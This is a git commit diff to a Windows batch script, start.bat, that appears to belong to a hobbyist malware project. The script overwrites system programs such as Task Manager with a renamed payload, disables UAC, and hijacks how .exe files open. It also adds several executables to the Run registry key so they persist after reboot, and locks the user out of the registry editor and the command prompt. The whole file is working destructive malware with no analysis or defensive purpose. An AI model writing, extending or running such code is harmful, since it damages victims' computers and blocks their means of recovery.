05a6dbcb663f139ecb5f82b8b40b6b782734218c
gachao0 <139936691+gachao0@users.noreply.github.com>
2023-07-25 13:03:15 +0900

    Add files via upload

--- start.bat
+++ start.bat
@@ -6,10 +6,14 @@ copy kill.txt a.txt
 del kill.txt
 ren a.txt kill.txt
 
+copy cmds.txt a.txt
+del cmds.txt
+ren a.txt cmds.txt
+
 
 ren devil.txt "mesa.exe"
 ren "kill.txt" "kill.exe"
-
+ren "cmds.txt" "cmds.exe"
 
 
 takeown /f C:\Windows\System32\taskmgr.exe & icacls C:\Windows\System32\taskmgr.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\taskmgr.exe"
@@ -24,16 +28,21 @@ takeown /f C:\Windows\system32\charmap.exe & icacls C:\Windows\system32\charmap.
 
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
-reg add "\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
 reg add HKEY_CLASSES_ROOT\exefile\shell\open\command /d C:\Windows\winnt32.exe"%1"%* /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe" /d "txtfile"
-
-set a=%cd%\kill.exe
+copy kill.exe %temp%
+set a=%temp%\kill.exe
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f
-set a=%cd%\block\devil.exe"
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "startm" /d  "%a%" /f
+copy "mess\mess.exe" %temp%
+copy "mess\mes.exe" %temp%
+set a=%temp%\mess.exe
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "mess" /d  "%a%" /f
+copy "cmds.exe" %temp%
+set a=%temp%\cmds.exe
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "mess" /d  "%a%" /f
 copy "block\mesa.exe" "C:\Windows\system"
+
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
 start ARTE.dll
